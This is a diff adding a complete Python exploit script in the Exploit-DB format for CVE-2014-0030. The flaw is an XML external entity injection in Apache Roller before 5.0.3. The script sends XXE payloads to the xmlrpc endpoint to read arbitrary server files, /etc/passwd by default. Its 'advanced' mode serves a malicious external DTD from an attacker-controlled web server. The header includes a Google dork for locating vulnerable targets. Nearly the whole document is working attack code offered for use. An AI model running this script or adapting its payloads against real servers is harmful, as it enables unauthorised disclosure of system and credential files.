@@ -1,0 +1,118 @@
+# Exploit Title: Apache Roller 5.0.3 - XML External Entity Injection (File Disclosure)
+# Google Dork: intext:"apache roller weblogger version {vulnerable_version_number}"
+# Date: 2018-09-05
+# Exploit Author: Marko Jokic
+# Contact: http://twitter.com/_MarkoJokic
+# Vendor Homepage: http://roller.apache.org/
+# Software Link: http://archive.apache.org/dist/roller/
+# Version: < 5.0.3
+# Tested on: Linux Ubuntu 14.04.1
+# CVE : CVE-2014-0030
+
+# This exploit lets you read almost any file on a vulnerable server via XXE vulnerability.
+# There are two types of payload this exploit is able to use, 'SIMPLE' & 'ADVANCED'.
+# 'SIMPLE' payload will work in most cases and will be used by default, if
+# server errors out, use 'ADVANCED' payload.
+# 'ADVANCED' payload will start local web server and serve malicious XML which
+# will be parsed by a target server.
+# To successfully perform attack with 'ADVANCED' payload, make sure that port
+# you listen on (--lport flag) is accessible out of the network.
+
+#!/usr/bin/env python
+
+import SimpleHTTPServer
+import SocketServer
+import argparse
+import sys
+import threading
+from xml.etree import ElementTree
+import urllib3
+
+import requests
+
+SIMPLE_PAYLOAD = """<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM "file://{}">]>
+<methodCall>
+   <methodName>&xxe;</methodName>
+</methodCall>
+"""
+
+ADVANCED_PAYLOAD = """<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % xxe SYSTEM "file://{}">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "{}">
+%dtd;
+]>
+<methodCall>
+   <methodName>&all;</methodName>
+</methodCall>
+"""
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+class MyHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-Type', 'text/html')
+        self.end_headers()
+        self.wfile.write('<!ENTITY all "%start;%xxe;%end;">')
+
+def check_exploit(host):
+    response = requests.post(host + "/roller-services/xmlrpc", verify=False)
+    if response.status_code == 200:
+        return True
+    return False
+
+def exploit(host, payload):
+    response = requests.post(host + "/roller-services/xmlrpc", data=payload, verify=False)
+    xml_tree = ElementTree.fromstring(response.text)
+    parsed_response = xml_tree.findall("fault/value/struct/member")[1][1].text
+    print parsed_response
+
+def start_web_server(port):
+    handler = MyHandler
+    httpd = SocketServer.TCPServer(('', port), handler, False)
+    httpd.allow_reuse_address = True
+    httpd.server_bind()
+    httpd.server_activate()
+    httpd.handle_request()
+    httpd.shutdown()
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-u', metavar="URL", dest="url", required=True, help="Target URL")
+    parser.add_argument('-f', metavar='FILE', dest="file", required=False, default="/etc/passwd", help="File to read from server")
+    parser.add_argument('--lhost', required='--rport' in sys.argv, help="Your IP address for http web server")
+    parser.add_argument('--lport', type=int, required='--rhost' in sys.argv, help="Port for web server to listen on")
+    args = parser.parse_args()
+
+    host = args.url
+    full_file_path = args.file
+
+    advanced = False
+    lhost = args.lhost
+    lport = args.lport
+
+    if lport is not None and lport is not None:
+        advanced = True
+
+    check = check_exploit(host)
+
+    if check:
+        if advanced:
+            th = threading.Thread(target=start_web_server, args=(lport,))
+            th.daemon = True
+            th.start()
+
+            payload = ADVANCED_PAYLOAD.format(full_file_path, "http://{}:{}".format(lhost, lport))
+        else:
+            payload = SIMPLE_PAYLOAD.format(full_file_path)
+
+        exploit(host, payload)
+    else:
+        print "[-] TARGET IS NOT VULNERABLE!"
+
+main()
